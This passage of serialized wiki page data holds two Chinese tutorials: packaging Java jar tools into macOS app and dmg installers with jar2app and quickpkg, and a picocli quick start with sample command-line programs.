Applications\n（4）右键dmg文件，”查看显示选项”中设置背景图片。\n\n\n1\n2\n3\n4\n5\n\n\n图片\n这里面踩了无数个坑，反反复复好长一段时间才解决。\n工具记得多读手册，例如在这里用的 jar2app 直接在 GitHub 上面多读手册，基本问题都能解决；\n图片\n图片\n实现同样功能的不同函数，在使用时需要按照需求进行使用。例如这里的 File ().exists () 与 File.getAbsoluteFile ()，不同函数名总有会不一样的地方，直接平时只是为了实现功能而忽略其本质，有时候出现问题的时候需要深入了解其本质；\nWin用户可以搜索Jar2exe 来对exe进行封包。\n遇到各种问题可以添加运营微信 进行沟通解决或着在GitHub上提Issues。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 原文\n\nhttps://mp.weixin.qq.com/s/X6fyn1vX1P52rUd9Pv_dvg\n\n简单记录，方便后续使用，如有侵权，联系删除。',normalizedContent:'# jar打包app\n\n> 在 mac 上运行 jar 文件（例如 burp\\哥斯拉\\冰蝎等）每次都需要java -jar xxxx.jar (当然特定的程序可能还需要添加一些java的参数)，感觉太繁琐了。因此，想打包成 app 方便使用。成功打包效果图，这里给大家提供打包出来的 app。\n> \n> 可以直接从github获取：https://github.com/nineriversec/mac_tools 各位师傅点个星星吧！\n\n那么转osx 目前来说一共是分为两种 ：\n\n * 有源码（打包的应用较大因为携带jdk）\n\n * 无源码：只有jar包（可自己选择是否携带jdk）\n\n\n# 有源码\n\n随便git clone 一个有gui的java源码，然后打开教育优惠的idea 按照如下打开后进行设置\n\n\n\n然后进行构建工件\n\n\n\n会在当前目录下生成一个新的文件夹 为 out/xxx(app的名字)/bundles/就会出现 这个软件的app了\n\n注意此方法会打包jdk环境到app里面体积较大！！！\n\n\n# 有源码\n\n安装jar2app\n\n#获取\ngit clone https://github.com/jorl17/jar2app\ncd jar2app\nchmod +x install.sh uninstall.sh\n#安装为全局命令\nsudo ./install.sh /usr/local/bin\n#卸载命令\n./uninstall.sh /usr/local/bin\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n使用方式\n\n#导出到文件夹\njar2app test.jar out\n#导出app\njar2app test.jar out.app\njar2app test.jar test/out.app\n#设置icon\njar2app test.jar -i icon.icns\njar2app test.jar -i /awesomeicons/icon.icns\n#设置名称\njar2app test.jar -n "amazing application" out.app\n#绑定jre\njar2app test.jar -r /library/java/javavirtualmachines/jdk1.8.0_40.jdk\njar2app test.jar -r /compressedjdks/jdk1.8.0_40.jdk.zip   \n#完整设置\njar2app test.jar -n "amazing application" out.app -i /awesomeicons/icon.icns \njar2app test.jar -n "amazing application" out.app -i /awesomeicons/icon.icns -r /compressedjdks/jdk1.8.0_40.jdk.zip  \n#带jdr、落款,设置菜单名,进行打包\njar2app df_home.jar -n "df_home" app/df_home.app -i /users/df/pictures/logo/df_logo/untitled.icns -c "copyright © 2020 df inc." -r /library/java/javavirtualmachines/jdk1.8.0_91.jdk\njar2app /users/df/documents/发布/df_home.jar  -n "df_home" /users/df/documents/发布/app/df_home.app -i /users/df/pictures/logo/df_logo/untitled.icns -c "copyright © 2020 df inc."\n#带落款,设置菜单名,进行打包\njar2app df_home.jar -n "df_home" app/df_home_0.app -i /users/df/pictures/logo/df_logo/untitled.icns -c "copyright © 2020 df inc."\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n对应参数解释\n\n-n : 就是程序运行时，在菜单栏上的名称\n\n-i : 转换成app之后，应用的logo，图片格式要使用.icns 后缀，这里提供一下png转.icns的url：https://iconverticons.com/online/\n\n-b : 可有可无的东西，这个是真的可有可无，就是一软件基础信息\n\n-v : 可有可无的东西，这个是真的可有可无，就是一软件基础信息\n\n-s : 可有可无的东西，这个是真的可有可无，就是一软件基础信息\n\n-m : 这个可以有，有了它软件启动能快一秒，没了它，app应用得去jar里面找main入口函数，所以，这个可以有，长生不老时间多的忽略这个参数。至于main入口在哪里看，用压缩包方式打开jar文件，里面找到meta-inf文件下的文件打开看看就好，可以看到main主函数入口信息的。\n\n-o : 就是让这个程序执行的时候，在标题栏有个菜单可以显示\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 封装dmg\n\nquickpkg可以快速方便的把app应用打包成pkg安装包，安装quickpkg：\n\ngit clone https://github.com/scriptingosx/quickpkg.git\n\ncd quickpkg\n\n\n1\n2\n3\n\n\napp封装为pkg：\n\n./quickpkg /users/csjar/xxxx.app --output /users/csjar/x x x x.pkg\n\n\n1\n\n\n不加--output参数指定输出路径，默认会在quickpkg目录下生成。\n\napp打包成dmg：\n\n（1）打开磁盘工具，选择文件 -> 新建映像 -> 空白映像\n（2）填写映像相关信息，其中大小需要设置的比app程序大一些。\n（3）进入dmg文件，在此处打开命令行，创建applications链接。\nln -s /applications/ applications\n（4）右键dmg文件，”查看显示选项”中设置背景图片。\n\n\n1\n2\n3\n4\n5\n\n\n图片\n这里面踩了无数个坑，反反复复好长一段时间才解决。\n工具记得多读手册，例如在这里用的 jar2app 直接在 github 上面多读手册，基本问题都能解决；\n图片\n图片\n实现同样功能的不同函数，在使用时需要按照需求进行使用。例如这里的 file ().exists () 与 file.getabsolutefile ()，不同函数名总有会不一样的地方，直接平时只是为了实现功能而忽略其本质，有时候出现问题的时候需要深入了解其本质；\nwin用户可以搜索jar2exe 来对exe进行封包。\n遇到各种问题可以添加运营微信 进行沟通解决或着在github上提issues。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 原文\n\nhttps://mp.weixin.qq.com/s/x6fyn1vx1p52rud9pv_dvg\n\n简单记录，方便后续使用，如有侵权，联系删除。',charsets:{cjk:!0},lastUpdated:"2022/05/01, 06:34:13",lastUpdatedTimestamp:1651386853e3},{title:"Java Picocli Quick Start",frontmatter:{title:"Java Picocli Quick Start",date:"2022-04-26T03:00:00.000Z",permalink:"/sec/skill/picocli-quick-start",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["奇淫巧技","小工具"],tags:["Java","CLI","Tools"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/203.%E5%A5%87%E6%B7%AB%E5%B7%A7%E6%8A%80/2030.%E5%B0%8F%E5%B7%A5%E5%85%B7/01.picocli.html",relativePath:"02.安全/203.奇淫巧技/2030.小工具/01.picocli.md",key:"v-880aa198",path:"/sec/skill/picocli-quick-start/",headers:[{level:2,title:"简介",slug:"简介",normalizedTitle:"简介",charIndex:431},{level:2,title:"入门案例",slug:"入门案例",normalizedTitle:"入门案例",charIndex:824},{level:3,title:"ASCIIArt 源码解读",slug:"asciiart-源码解读",normalizedTitle:"asciiart 源码解读",charIndex:1619},{level:3,title:"运行程序",slug:"运行程序",normalizedTitle:"运行程序",charIndex:4953},{level:2,title:"子命令案例",slug:"子命令案例",normalizedTitle:"子命令案例",charIndex:5175},{level:3,title:"源码解读",slug:"源码解读",normalizedTitle:"源码解读",charIndex:1628},{level:3,title:"执行和改写以上的代码",slug:"执行和改写以上的代码",normalizedTitle:"执行和改写以上的代码",charIndex:9223},{level:2,title:"选项和参数",slug:"选项和参数",normalizedTitle:"选项和参数",charIndex:13655},{level:3,title:"选项注解",slug:"选项注解",normalizedTitle:"选项注解",charIndex:13742},{level:3,title:"参数注解",slug:"参数注解",normalizedTitle:"参数注解",charIndex:15014},{level:2,title:"强类型转换",slug:"强类型转换",normalizedTitle:"强类型转换",charIndex:15826},{level:3,title:"类型转换",slug:"类型转换",normalizedTitle:"类型转换",charIndex:15827},{level:3,title:"集合和字典",slug:"集合和字典",normalizedTitle:"集合和字典",charIndex:16092},{level:2,title:"必选参数",slug:"必选参数",normalizedTitle:"必选参数",charIndex:16513},{level:3,title:"必选选项",slug:"必选选项",normalizedTitle:"必选选项",charIndex:16522},{level:3,title:"必选参数",slug:"必选参数-2",normalizedTitle:"必选参数",charIndex:16513},{level:2,title:"多值",slug:"多值",normalizedTitle:"多值",charIndex:16826},{level:3,title:"重复选项",slug:"重复选项",normalizedTitle:"重复选项",charIndex:16833},{level:3,title:"正则拆分",slug:"正则拆分",normalizedTitle:"正则拆分",charIndex:17009},{level:3,title:"arity",slug:"arity",normalizedTitle:"arity",charIndex:6781},{level:2,title:"Help选项",slug:"help选项",normalizedTitle:"help选项",charIndex:4585},{level:3,title:"自定义help选项",slug:"自定义help选项",normalizedTitle:"自定义help选项",charIndex:18396},{level:2,title:"Version Help",slug:"version-help",normalizedTitle:"version help",charIndex:19418},{level:3,title:"静态版本信息",slug:"静态版本信息",normalizedTitle:"静态版本信息",charIndex:19435},{level:3,title:"动态版本信息",slug:"动态版本信息",normalizedTitle:"动态版本信息",charIndex:19968},{level:2,title:"Usage Help",slug:"usage-help",normalizedTitle:"usage help",charIndex:20124},{level:3,title:"使用信息示例",slug:"使用信息示例",normalizedTitle:"使用信息示例",charIndex:20139},{level:3,title:"使用帮助消息元素",slug:"使用帮助消息元素",normalizedTitle:"使用帮助消息元素",charIndex:21783},{level:2,title:"ANSI颜色和风格",slug:"ansi颜色和风格",normalizedTitle:"ansi颜色和风格",charIndex:25056},{level:3,title:"彩色示例",slug:"彩色示例",normalizedTitle:"彩色示例",charIndex:25070},{level:3,title:"样式和颜色的使用帮助",slug:"样式和颜色的使用帮助",normalizedTitle:"样式和颜色的使用帮助",charIndex:25125},{level:3,title:"更多颜色",slug:"更多颜色",normalizedTitle:"更多颜色",charIndex:26508},{level:3,title:"支持的平台",slug:"支持的平台",normalizedTitle:"支持的平台",charIndex:26678},{level:3,title:"强制开启或关闭ANSI",slug:"强制开启或关闭ansi",normalizedTitle:"强制开启或关闭ansi",charIndex:26781},{level:2,title:"子命令",slug:"子命令",normalizedTitle:"子命令",charIndex:5175},{level:3,title:"注册子命令",slug:"注册子命令",normalizedTitle:"注册子命令",charIndex:8507},{level:3,title:"解析子命令",slug:"解析子命令",normalizedTitle:"解析子命令",charIndex:28570},{level:3,title:"@ParentCommand注解",slug:"parentcommand注解",normalizedTitle:"@parentcommand注解",charIndex:30410},{level:3,title:"子命令的使用帮助",slug:"子命令的使用帮助",normalizedTitle:"子命令的使用帮助",charIndex:23772},{level:2,title:"重复使用",slug:"重复使用",normalizedTitle:"重复使用",charIndex:32024},{level:2,title:"执行命令",slug:"执行命令",normalizedTitle:"执行命令",charIndex:32542},{level:3,title:"退出代码",slug:"退出代码",normalizedTitle:"退出代码",charIndex:4433},{level:3,title:"生成退出代码",slug:"生成退出代码",normalizedTitle:"生成退出代码",charIndex:33877},{level:3,title:"例外退出代码",slug:"例外退出代码",normalizedTitle:"例外退出代码",charIndex:34501},{level:3,title:"执行配置",slug:"执行配置",normalizedTitle:"执行配置",charIndex:34847},{level:3,title:"处理错误",slug:"处理错误",normalizedTitle:"处理错误",charIndex:4378},{level:3,title:"迁移",slug:"迁移",normalizedTitle:"迁移",charIndex:35453},{level:2,title:"追踪",slug:"追踪",normalizedTitle:"追踪",charIndex:35595},{level:2,title:"自动补全",slug:"自动补全",normalizedTitle:"自动补全",charIndex:37e3},{level:2,title:"更多",slug:"更多",normalizedTitle:"更多",charIndex:4510}],excerpt:'<h1 id="picocli"><a class="header-anchor" href="#picocli">#</a> picocli</h1>\n<blockquote>\n<p>最近突发奇想尝试用Java写一写安全小工具。不过万事开头难，如何在命令行上打印帮助文档竟然一直困扰着我。当然，这个实现起来其实不难，但是写起来混乱且不美观。</p>\n<p>刚开始的时候，为了打印出彩色的字符，我尝试使用<code>\\033[</code>这种转义字符，并写了一个工具类，用于生成指定格式和颜色的打印字符串。其实，针对于命令行早有其他的解决方案，且使用起来比较顺手和规范（我差点想自己写一个——何必重复造轮子呢），诸如Apache Commons CLI等。在尝试使用Commons CLI时，我发现它确实好用，但是似乎满足不了彩色打印的需求。于是我开始寻找其他的解决方案，最终发现了picocli。</p>\n</blockquote>\n',headersStr:"简介 入门案例 ASCIIArt 源码解读 运行程序 子命令案例 源码解读 执行和改写以上的代码 选项和参数 选项注解 参数注解 强类型转换 类型转换 集合和字典 必选参数 必选选项 必选参数 多值 重复选项 正则拆分 arity Help选项 自定义help选项 Version Help 静态版本信息 动态版本信息 Usage Help 使用信息示例 使用帮助消息元素 ANSI颜色和风格 彩色示例 样式和颜色的使用帮助 更多颜色 支持的平台 强制开启或关闭ANSI 子命令 注册子命令 解析子命令 @ParentCommand注解 子命令的使用帮助 重复使用 执行命令 退出代码 生成退出代码 例外退出代码 执行配置 处理错误 迁移 追踪 自动补全 更多",content:'# picocli\n\n> 最近突发奇想尝试用Java写一写安全小工具。不过万事开头难，如何在命令行上打印帮助文档竟然一直困扰着我。当然，这个实现起来其实不难，但是写起来混乱且不美观。\n> \n> 刚开始的时候，为了打印出彩色的字符，我尝试使用\\033[这种转义字符，并写了一个工具类，用于生成指定格式和颜色的打印字符串。其实，针对于命令行早有其他的解决方案，且使用起来比较顺手和规范（我差点想自己写一个——何必重复造轮子呢），诸如Apache Commons CLI等。在尝试使用Commons CLI时，我发现它确实好用，但是似乎满足不了彩色打印的需求。于是我开始寻找其他的解决方案，最终发现了picocli。\n\n快速入门文档地址：https://picocli.info/quick-guide.html\n\n完整文档地址：https://picocli.info\n\nGithub地址：https://github.com/remkop/picocli\n\n\n# 简介\n\n> Picocli使用接近零代码的方式在一个文件中完成Java CLI程序的创建，Picocli的目标是创建一个可以在JVM运行或者脱离JVM的请打命令行应用。\n\nPicocli支持诸如：POSIX、GNU、MS-DOS等多种命令行语法样式，并且可以ANSI颜色和样式生成高度定制化的帮助信息。基于Picocli创建的命令行程序支持任何层级下的命令参数提示和补全。基于picocli的应用程序可以提前编译为GRaalVM本机映像，启动时间极快，内存要求更低，可以作为单个可执行文件分发。Picocli还可以为您的应用程序生成精美的文档，格式包括HTML、PDF和Unix手册页。\n\n使用帮助的例子：\n\n\n\n> 本文使用picocli的注解API。对于无法使用注解的应用程序，还有一个编程API，用于定义预期的选项和位置参数，并处理解析结果。本快速指南不涵盖编程API。\n\n\n# 入门案例\n\n下面以一个小型但功能齐全的基于picocli的命令行应用程序ASCIIArt作为示例代码。\n\nASCIIArt将一个或多个参数转换为ASCII字符画，并将其打印出来。使用方法如下：\n\n$ java -cp "myapp.jar;picocli-4.6.3.jar" ASCIIArt --font-size=9 Hello picocli\n       #   #       #  #                 #                  #  #\n       #   #       #  #                                    #\n       #   #  ***  #  #  ****     #***  #  **#  ****  **#  #  #\n       #####  ***  #  #  ****     #***  #  **   ****  **   #  #\n       #   #  *#*  #  #  *  *     #  *  #  *    *  *  *    #  #\n       #   #  **   #  #  ****     #***  #  **   ****  **   #  #\n       #   #  **#  #  #  ****     #***  #  **#  ****  **#  #  #\n                                  #\n                                  *\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n如果你想直接以以下的方式运行，可以查看应用打包的相关文档。\n\nASCIIArt --font-size=9 Hello picocli\n\n\n1\n\n\n\n# ASCIIArt 源码解读\n\nASCIIArt的代码缩短如下：\n\n/**\n * ASCII Art: Basic Picocli based sample application\n * Explanation: <a href="https://picocli.info/quick-guide.html#_basic_example_asciiart">Picocli quick guide</a>\n * Source Code: <a href="https://github.com/remkop/picocli/blob/master/picocli-examples/src/main/java/picocli/examples/i18n/I18NDemo.java">GitHub</a> \n * @author Andreas Deininger\n */\nimport picocli.CommandLine;\nimport picocli.CommandLine.Command;\nimport picocli.CommandLine.Option;\nimport picocli.CommandLine.Parameters;\n\nimport java.awt.Font;\nimport java.awt.Graphics;\nimport java.awt.Graphics2D;\nimport java.awt.RenderingHints;\nimport java.awt.image.BufferedImage;\n\n@Command(name = "ASCIIArt", version = "ASCIIArt 1.0", mixinStandardHelpOptions = true) // |1|\npublic class ASCIIArt implements Runnable { // |2|\n\n    @Option(names = { "-s", "--font-size" }, description = "Font size") // |3|\n    int fontSize = 14;\n\n    @Parameters(paramLabel = "<word>", defaultValue = "Hello, picocli",  // |4|\n               description = "Words to be translated into ASCII art.")\n    private String[] words = { "Hello,", "picocli" }; // |5|\n\n    @Override\n    public void run() { // |6|\n        // https://stackoverflow.com/questions/7098972/ascii-art-java\n        BufferedImage image = new BufferedImage(144, 32, BufferedImage.TYPE_INT_RGB);\n        Graphics graphics = image.getGraphics();\n        graphics.setFont(new Font("Dialog", Font.PLAIN, fontSize));\n        Graphics2D graphics2D = (Graphics2D) graphics;\n        graphics2D.setRenderingHint(RenderingHints.KEY_TEXT_ANTIALIASING,\n                RenderingHints.VALUE_TEXT_ANTIALIAS_ON);\n        graphics2D.drawString(String.join(" ", words), 6, 24);\n\n        for (int y = 0; y < 32; y++) {\n            StringBuilder builder = new StringBuilder();\n            for (int x = 0; x < 144; x++)\n                builder.append(image.getRGB(x, y) == -16777216 ? " " : image.getRGB(x, y) == -1 ? "#" : "*");\n            if (builder.toString().trim().isEmpty()) continue;\n            System.out.println(builder);\n        }\n    }\n\n    public static void main(String[] args) {\n        int exitCode = new CommandLine(new ASCIIArt()).execute(args); // |7|\n        System.exit(exitCode); // |8|\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n我们可以把上面的代码拆分来看：\n\n 1. 创建一个类继承Runable或者Callable。\n 2. 使用@Command注解标注这个类，并设置一个名字；mixinStandardHelpOptions选项用于生成一个帮助和版本文档（使用参数--help和--version）。\n 3. 给每一个命令选项对应的成员变量添加一个@Option注解，如上所示，你可以定义一个选项的名称和注释。当然，还有一些其他的选项。\n 4. 给每一个可能的参数添加一个@Parameters注解，Picocli将把命令行参数转换为强类型值，并将这些值注入被注解的字段。\n 5. 在类的run或call方法中定义您的业务逻辑。解析成功完成后调用此方法。\n 6. 在类的main方法中，使用CommandLine.execute方法引导应用程序。这将解析命令行，处理错误，处理使用请求和版本帮助，并调用业务逻辑。\n 7. CommandLine.execute方法返回一个退出代码。您的应用程序可以使用此退出代码调用System.exit，以表示调用过程的成功或失败。\n\n这是几乎任何picocli应用的基本框架。\n\n> 有关更多使用帮助，请参阅参考手册，例如给方法添加一个注解。\n\n像任何专业的命令行应用程序一样，ASCIIArt有--help和--version选项。--Help选项向用户展示了如何使用应用程序。Picocli会自动生成此使用帮助消息：\n\n$ ASCIIArt --help\nUsage: ASCIIArt [-hV] [-s=<fontsize>] [<word>...]\n      [<word>...]             Words to be translated into ASCII art.\n  -s, --font-size=<fontSize>  Font size\n  -h, --help                  Show this help message and exit.\n  -V, --version               Print version information and exit.\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 运行程序\n\n添加picocli依赖。\n\n<dependencies>\n  <dependency>\n    <groupId>info.picocli</groupId>\n    <artifactId>picocli</artifactId>\n    <version>4.6.3</version>\n  </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n设置运行参数为-h并运行。\n\n\n\n\n# 子命令案例\n\n下面我们展示了另一个小型但功能齐全的基于picocli的命令行应用程序示例，该应用程序解释了子命令的使用：ISOCodeResolver。\n\n该应用程序有两个子命令，语言和国家，根据ISO标准解析语言或国家代码（国家代码为ISO-3166-1，语言代码为ISO-639-1/639-2）。该应用程序可以按以下方式使用：\n\n$ java -cp "myapp.jar;picocli-4.6.3.jar" ISOCodeResolver language de cs en sd se\nde: German\ncs: Czech\nen: English\nsd: Sindhi\nse: Northern Sami\n\n\n1\n2\n3\n4\n5\n6\n\n\n或者：\n\n$ java -cp "myapp.jar;picocli-4.6.3.jar" ISOCodeResolver country cn fr th ro no\nCN: China\nFR: France\nTH: Thailand\nRO: Romania\nNO: Norway\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 源码解读\n\n源代码如下所示：\n\n/*\n * ISO code resolver: Picocli based sample application (with subcommands)\n * Explanation: <a href="https://picocli.info/quick-guide.html#_subcommands_example_iso_code_resolver">Picocli quick guide</a>\n * Source Code: <a href="https://github.com/remkop/picocli/blob/master/picocli-examples/src/main/java/picocli/examples/subcommands/SubcommandDemo.java">GitHub</a> \n * @author Andreas Deininger\n */\nimport picocli.CommandLine;\nimport picocli.CommandLine.Command;\nimport picocli.CommandLine.Model.CommandSpec;\nimport picocli.CommandLine.Parameters;\nimport picocli.CommandLine.ParameterException;\nimport picocli.CommandLine.Spec;\nimport java.util.Locale;\n\n@Command(name = "ISOCodeResolver", subcommands = { SubcommandAsClass.class, CommandLine.HelpCommand.class }, // |2|\n         description = "Resolve ISO country codes (ISO-3166-1) or language codes (ISO 639-1 or -2)")\npublic class ISOCodeResolver implements Runnable { // |1|\n  @Spec CommandSpec spec;\n\n  @Command(name = "country", description = "Resolve ISO country code (ISO-3166-1, Alpha-2 code)") // |3|\n  void subCommandViaMethod(@Parameters(arity = "1..*", paramLabel = "<country code>",\n                                       description = "country code(s) to be resolved") String[] countryCodes) {\n    for (String code : countryCodes) {\n      System.out.println(String.format("%s: %s", code.toUpperCase(), new Locale("", code).getDisplayCountry()));\n    }\n  }\n\n  @Override\n  public void run() {\n    throw new ParameterException(spec.commandLine(), "Specify a subcommand");\n  }\n\n  public static void main(String[] args) {\n    int exitCode = new CommandLine(new ISOCodeResolver()).execute(args); // |5|\n    System.exit(exitCode); // |6|\n  }\n}\n\n@Command(name = "language", description = "Resolve ISO language code (ISO 639-1 or -2, two/three letters)") // |4|\nclass SubcommandAsClass implements Runnable {\n\n  @Parameters(arity = "1..*", paramLabel = "<language code>", description = "language code(s) to be resolved")\n  private String[] languageCodes;\n\n  @Override\n  public void run() {\n    for (String code : languageCodes) {\n      System.out.println(String.format("%s: %s", code.toLowerCase(), new Locale(code).getDisplayLanguage()));\n    }\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n 1. 当顶级命令没有实现Runnable或Callable时，用户必须指定一个子命令（子命令成为必填项）。这是可选的：如果父命令可以在应用程序中无需子命令的情况下自行执行，只需实现Runnable或Callable即可。\n 2. 使用@Command标注这个类，同时需要注意的是我们使用CommandLine.HelpCommand.class作为子类，生成help子命令。\n 3. 可以通过两种方式将自定义子命令添加到顶级命令中。最简单的方法是向类中的方法添加@Command注解。对于子命令的每个选项和位置参数，添加一个方法参数，并使用@Option或@Parameters注释对这些方法参数进行注释。在上面的示例中，一旦用户调用子命令contary，关联方法subCommandViaMethod就会被调用。\n 4. 在较大的应用程序中，通常为每个子命令创建一个单独的@Command注释的类。在上面的示例中，SubcommandAsClass类表示language子命令。一旦用户调用此子命令，将调用该类的重写的run方法。要注册子命令，请在父命令的@Command注释的子命令属性中指定子命令类（subcommands = { SubcommandAsClass.class, ... }）。\n 5. 在类的main方法中，使用CommandLine.execute方法引导应用程序。这将解析命令行，处理错误，处理使用请求和版本帮助，并调用业务逻辑。\n 6. CommandLine.execute方法返回一个退出代码。您的应用程序可以使用此退出代码调用System.exit，以表示调用过程的成功或失败。\n\n> 有关子命令的更多详细信息和方面，请参阅参考手册的子命令一章。\n\n除了两个用户定义的子命令外，ISOCodeResolver应用程序还提供了一个帮助子命令，该子命令将使用帮助消息打印到控制台。Picocli会自动生成此使用帮助消息：\n\n$ ISOCodeResolver help\nUsage: ISOCodeResolver [COMMAND]\nResolves ISO country codes (ISO-3166-1) or language codes (ISO-639-1/-2)\nCommands:\n  help      Displays help information about the specified command\n  country   Resolves ISO country codes (ISO-3166-1)\n  language  Resolves one or more ISO language codes (ISO-639-1 or 639-2)\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 执行和改写以上的代码\n\n完全使用方法实现，改写如下：\n\npackage com.pwddd.picocli;/*\n * ISO code resolver: Picocli based sample application (with subcommands)\n * Explanation: <a href="https://picocli.info/quick-guide.html#_subcommands_example_iso_code_resolver">Picocli quick guide</a>\n * Source Code: <a href="https://github.com/remkop/picocli/blob/master/picocli-examples/src/main/java/picocli/examples/subcommands/SubcommandDemo.java">GitHub</a>\n * @author Andreas Deininger\n */\nimport picocli.CommandLine;\nimport picocli.CommandLine.Command;\nimport picocli.CommandLine.Model.CommandSpec;\nimport picocli.CommandLine.Parameters;\nimport picocli.CommandLine.ParameterException;\nimport picocli.CommandLine.Spec;\nimport java.util.Locale;\n\n@Command(name = "ISOCodeResolver", subcommands = { CommandLine.HelpCommand.class }, // |2|\n         description = "Resolve ISO country codes (ISO-3166-1) or language codes (ISO 639-1 or -2)")\npublic class ISOCodeResolver  { // |1|\n  @Spec CommandSpec spec;\n\n  @Command(name = "country", description = "Resolve ISO country code (ISO-3166-1, Alpha-2 code)") // |3|\n  void subCommandViaMethod(@Parameters(arity = "1..*", paramLabel = "<country code>",\n                                       description = "country code(s) to be resolved") String[] countryCodes) {\n    for (String code : countryCodes) {\n      System.out.println(String.format("%s: %s", code.toUpperCase(), new Locale("", code).getDisplayCountry()));\n    }\n  }\n\n  @Command(name = "language",description = "Resolve ISO language code (ISO 639-1 or -2, two/three letters)")\n  void subCommandViaMethodLanguage(@Parameters(arity = "1..*",\n          paramLabel = "<language code>",\n          description = "language code(s) to be resolved") String[] languageCodes){\n    for (String code : languageCodes) {\n      System.out.println(String.format("%s: %s", code.toLowerCase(), new Locale(code).getDisplayLanguage()));\n    }\n  }\n\n  public static void main(String[] args) {\n    int exitCode = new CommandLine(new ISOCodeResolver()).execute(args); // |5|\n    System.exit(exitCode); // |6|\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n完全使用类实现，改写如下：\n\npackage com.pwddd.picocli;/*\n * ISO code resolver: Picocli based sample application (with subcommands)\n * Explanation: <a href="https://picocli.info/quick-guide.html#_subcommands_example_iso_code_resolver">Picocli quick guide</a>\n * Source Code: <a href="https://github.com/remkop/picocli/blob/master/picocli-examples/src/main/java/picocli/examples/subcommands/SubcommandDemo.java">GitHub</a>\n * @author Andreas Deininger\n */\nimport picocli.CommandLine;\nimport picocli.CommandLine.Command;\nimport picocli.CommandLine.Model.CommandSpec;\nimport picocli.CommandLine.Parameters;\nimport picocli.CommandLine.ParameterException;\nimport picocli.CommandLine.Spec;\nimport java.util.Locale;\n\n@Command(name = "ISOCodeResolver", subcommands = { CommandLine.HelpCommand.class,LanguageCommand.class,CountryCommand.class }, // |2|\n         description = "Resolve ISO country codes (ISO-3166-1) or language codes (ISO 639-1 or -2)")\npublic class ISOCodeResolver  { // |1|\n\n  public static void main(String[] args) {\n    int exitCode = new CommandLine(new ISOCodeResolver()).execute(args); // |5|\n    System.exit(exitCode); // |6|\n  }\n}\n\n@Command(name = "language",description = "Resolve ISO language code (ISO 639-1 or -2, two/three letters)")\nclass LanguageCommand implements Runnable{\n\n  @Parameters(arity = "1..*", paramLabel = "<language code>", description = "language code(s) to be resolved")\n  private String[] languageCodes;\n\n  @Override\n  public void run() {\n    for (String code : languageCodes) {\n      System.out.println(String.format("%s: %s", code.toLowerCase(), new Locale(code).getDisplayLanguage()));\n    }\n  }\n}\n\n@Command(name = "country",description = "Resolve ISO country code (ISO-3166-1, Alpha-2 code)")\nclass CountryCommand implements Runnable{\n\n  @Parameters(arity = "1..*", paramLabel = "<country code>", description = "country code(s) to be resolved")\n  private String[] countryCodes;\n\n  @Override\n  public void run() {\n    for (String code : countryCodes) {\n      System.out.println(String.format("%s: %s", code.toUpperCase(), new Locale("", code).getDisplayCountry()));\n    }\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n\n\n\n# 选项和参数\n\n命令行参数可以分为选项和位置参数。选项有一个名称，位置参数通常是选项后面的值，但它们可能是混合的。\n\n\n\nPicocli对选项和位置参数有单独的注解。\n\n\n# 选项注解\n\n# 普通选项\n\n选项必须有一个或多个名称。选项名称通常以-或--开头，但picocli允许您使用您想要的任何选项名称。\n\n下面的示例显示了具有一个或多个名称的选项、使用选项参数的选项和帮助选项。\n\nclass Tar {\n  @Option(names = "-c", description = "create a new archive")\n  boolean create;\n\n  @Option(names = { "-f", "--file" }, paramLabel = "ARCHIVE", description = "the archive file")\n  File archive;\n\n  @Parameters(paramLabel = "FILE", description = "one or more files to archive")\n  File[] files;\n\n  @Option(names = { "-h", "--help" }, usageHelp = true, description = "display a help message")\n  private boolean helpRequested;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nPicocli匹配选项名称来设置字段值。\n\nPicocli支持POSIX集群短选项：一个或多个没有选项参数的单个字符选项，其次是最多一个带有选项参数的选项，可以分组在一个“-”破折号后面。\n\nString[] args = { "-c", "--file", "result.tar", "file1.txt", "file2.txt" };\nTar tar = new Tar();\nnew CommandLine(tar).parseArgs(args);\n\nassert !tar.helpRequested;\nassert  tar.create;\nassert  tar.archive.equals(new File("result.tar"));\nassert  Arrays.equals(tar.files, new File[] {new File("file1.txt"), new File("file2.txt")});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n例如，对于上面的Tar示例，以下命令行调用是等价的：\n\ntar -c -f result.tar f1.txt f2.txt\ntar -cf result.tar f1.txt f2.txt\ntar -cfresult.tar f1.txt 